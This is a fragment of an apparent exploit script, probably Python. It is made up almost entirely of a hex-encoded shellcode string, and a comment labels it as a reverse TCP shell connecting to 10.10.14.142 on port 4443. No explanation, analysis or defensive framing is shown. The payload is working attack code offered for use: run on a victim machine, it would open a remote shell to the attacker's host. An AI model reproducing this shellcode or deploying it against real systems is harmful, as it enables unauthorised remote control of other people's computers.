...
# Reverse TCP to 10.10.14.142 on port 4443
shellcode =  ""
shellcode += "\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0"
shellcode += "\x5e\x81\x76\x0e\xf3\xc8\x9b\xbd\x83\xee\xfc"
shellcode += "\xe2\xf4\x0f\x20\x19\xbd\xf3\xc8\xfb\x34\x16"
shellcode += "\xf9\x5b\xd9\x78\x98\xab\x36\xa1\xc4\x10\xef"
shellcode += "\xe7\x43\xe9\x95\xfc\x7f\xd1\x9b\xc2\x37\x37"
shellcode += "\x81\x92\xb4\x99\x91\xd3\x09\x54\xb0\xf2\x0f"
shellcode += "\x79\x4f\xa1\x9f\x10\xef\xe3\x43\xd1\x81\x78"
shellcode += "\x84\x8a\xc5\x10\x80\x9a\x6c\xa2\x43\xc2\x9d"
shellcode += "\xf2\x1b\x10\xf4\xeb\x2b\xa1\xf4\x78\xfc\x10"
shellcode += "\xbc\x25\xf9\x64\x11\x32\x07\x96\xbc\x34\xf0"
shellcode += "\x7b\xc8\x05\xcb\xe6\x45\xc8\xb5\xbf\xc8\x17"
shellcode += "\x90\x10\xe5\xd7\xc9\x48\xdb\x78\xc4\xd0\x36"
shellcode += "\xab\xd4\x9a\x6e\x78\xcc\x10\xbc\x23\x41\xdf"
shellcode += "\x99\xd7\x93\xc0\xdc\xaa\x92\xca\x42\x13\x97"
shellcode += "\xc4\xe7\x78\xda\x70\x30\xae\xa0\xa8\x8f\xf3"
shellcode += "\xc8\xf3\xca\x80\xfa\xc4\xe9\x9b\x84\xec\x9b"
shellcode += "\xf4\x37\x4e\x05\x63\xc9\x9b\xbd\xda\x0c\xcf"
shellcode += "\xed\x9b\xe1\x1b\xd6\xf3\x37\x4e\xed\xa3\x98"
shellcode += "\xcb\xfd\xa3\x88\xcb\xd5\x19\xc7\x44\x5d\x0c"
shellcode += "\x1d\x0c\xd7\xf6\xa0\x91\xb7\xfd\x46\xf3\xbf"
shellcode += "\xf3\xd9\xc0\x34\x15\xa2\x8b\xeb\xa4\xa0\x02"
shellcode += "\x18\x87\xa9\x64\x68\x76\x08\xef\xb1\x0c\x86"
shellcode += "\x93\xc8\x1f\xa0\x6b\x08\x51\x9e\x64\x68\x9b"
shellcode += "\xab\xf6\xd9\xf3\x41\x78\xea\xa4\x9f\xaa\x4b"
shellcode += "\x99\xda\xc2\xeb\x11\x35\xfd\x7a\xb7\xec\xa7"
shellcode += "\xbc\xf2\x45\xdf\x99\xe3\x0e\x9b\xf9\xa7\x98"
shellcode += "\xcd\xeb\xa5\x8e\xcd\xf3\xa5\x9e\xc8\xeb\x9b"
shellcode += "\xb1\x57\x82\x75\x37\x4e\x34\x13\x86\xcd\xfb"
shellcode += "\x0c\xf8\xf3\xb5\x74\xd5\xfb\x42\x26\x73\x7b"
shellcode += "\xa0\xd9\xc2\xf3\x1b\x66\x75\x06\x42\x26\xf4"
shellcode += "\x9d\xc1\xf9\x48\x60\x5d\x86\xcd\x20\xfa\xe0"
shellcode += "\xba\xf4\xd7\xf3\x9b\x64\x68"
